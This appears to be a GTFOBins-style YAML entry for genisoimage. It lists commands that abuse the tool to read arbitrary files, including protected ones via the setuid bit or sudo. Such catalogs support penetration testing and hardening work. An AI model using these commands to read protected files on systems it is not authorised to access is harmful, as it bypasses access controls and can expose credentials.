---
description: The output is placed inside the ISO9660 file system binary format thus it may not be suitable for binary content as is, yet it can be mounted or extracted with tools like `7z`.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        genisoimage -q -o - "$LFILE"
  suid:
    - description: Read $LFILE if genisoimage has the setuid bit
      code: |
        LFILE=file_to_read
        genisoimage -sort "$LFILE"
  sudo:
    - code: |
        LFILE=file_to_read
        sudo genisoimage -q -o - "$LFILE"
---
